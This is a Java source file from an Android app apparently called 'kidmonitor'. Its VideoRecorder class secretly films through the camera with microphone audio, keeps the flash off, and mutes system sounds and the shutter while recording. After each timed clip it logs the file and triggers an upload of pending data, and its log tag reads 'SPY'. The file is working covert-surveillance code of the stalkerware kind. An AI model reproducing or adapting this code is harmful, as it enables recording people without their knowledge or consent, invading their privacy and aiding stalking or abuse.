package com.byteshaft.kidmonitor.recorders;


import android.content.Context;
import android.hardware.Camera;
import android.media.MediaRecorder;
import android.util.Log;
import android.view.Display;
import android.view.Surface;
import android.view.SurfaceHolder;
import android.view.WindowManager;

import com.byteshaft.ezflashlight.CameraStateChangeListener;
import com.byteshaft.ezflashlight.Flashlight;
import com.byteshaft.kidmonitor.AppGlobals;
import com.byteshaft.kidmonitor.constants.AppConstants;
import com.byteshaft.kidmonitor.database.MonitorDatabase;
import com.byteshaft.kidmonitor.utils.Helpers;
import com.byteshaft.kidmonitor.utils.Silencer;

import java.io.IOException;

public class VideoRecorder implements CameraStateChangeListener,
        CustomMediaRecorder.OnNewFileWrittenListener,
        CustomMediaRecorder.OnRecordingStateChangedListener {

    private static boolean sIsRecording;
    private CustomMediaRecorder mMediaRecorder;
    private Flashlight flashlight;
    private Helpers mHelpers;
    private int mRecordTime;
    private String mPath;
    public static boolean isRecording() {
        return sIsRecording;
    }

    void start(android.hardware.Camera camera, SurfaceHolder holder, int time) {
        mHelpers = new Helpers();
        Camera.Parameters parameters = camera.getParameters();
        Helpers.setOrientation(parameters);
        parameters.setFlashMode(Camera.Parameters.FLASH_MODE_OFF);
        camera.setParameters(parameters);
        camera.unlock();
        mMediaRecorder = CustomMediaRecorder.getInstance();
        mMediaRecorder.setOnNewFileWrittenListener(this);
        mMediaRecorder.setOnRecordingStateChangedListener(this);
        mMediaRecorder.setCamera(camera);
        mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mMediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
        mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
        mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
        mMediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.DEFAULT);
        mMediaRecorder.setVideoEncodingBitRate(Helpers.getBitRateForResolution(
                AppConstants.VIDEO_WIDTH, AppConstants.VIDEO_HEIGHT));
        setOrientation();
        mMediaRecorder.setVideoSize(AppConstants.VIDEO_WIDTH, AppConstants.VIDEO_HEIGHT);
        mMediaRecorder.setPreviewDisplay(holder.getSurface());
        mPath = AppGlobals.getNewFilePathForType(AppConstants.TYPE_VIDEO_RECORDINGS);
        mMediaRecorder.setOutputFile(mPath);
        try {
            mMediaRecorder.prepare();
            Silencer.silentSystemStream(2000);
            mMediaRecorder.start();
            AppGlobals.videoRecordingInProgress(true);
        } catch (IOException e) {
            e.printStackTrace();
        }

        new android.os.Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                if (isRecording()) {
                    stopRecording();
                }

            }
        }, time);
    }

    public void start(int time) {
        mRecordTime = time;
        flashlight = new Flashlight(AppGlobals.getContext());
        flashlight.setCameraStateChangedListener(this);
        flashlight.setupCameraPreview();
        sIsRecording = true;
    }

    public void stopRecording() {
        Silencer.silentSystemStream(2000);
        mMediaRecorder.stop();
        mMediaRecorder.reset();
        mMediaRecorder.release();
        flashlight.releaseAllResources();
        sIsRecording = false;
        AppGlobals.videoRecordingInProgress(false);
        if (mPath != null) {
            MonitorDatabase database = new MonitorDatabase(AppGlobals.getContext());
            database.createNewEntry(AppConstants.TYPE_VIDEO_RECORDINGS, mPath, Helpers.getTimeStamp());
            Helpers.checkInternetAndUploadPendingData();
        }
    }

    @Override
    public void onCameraInitialized() {

    }

    @Override
    public void onCameraViewSetup(Camera camera, SurfaceHolder surfaceHolder) {
        Camera.CameraInfo info = new Camera.CameraInfo();
        Camera.getCameraInfo(0, info);
        if (info.canDisableShutterSound) {
            camera.enableShutterSound(false);
        }
        start(camera, surfaceHolder, mRecordTime);
    }

    @Override
    public void onCameraBusy() {

    }

    @Override
    public void onNewRecordingCompleted(String path) {

    }

    @Override
    public void onStop(int stopper, String filePath) {

    }

    private void setOrientation() {
        Display display = ((WindowManager) AppGlobals.getContext().getSystemService(Context.WINDOW_SERVICE)).getDefaultDisplay();
        switch (display.getRotation()) {
            case Surface.ROTATION_0:
                Log.i("SPY", "0");
                mMediaRecorder.setOrientationHint(90);
                break;
            case Surface.ROTATION_90:
                Log.i("SPY", "90");
                break;
            case Surface.ROTATION_180:
                Log.i("SPY", "180");
                break;
            case Surface.ROTATION_270:
                Log.i("SPY", "270");
                mMediaRecorder.setOrientationHint(180);
        }
    }
}
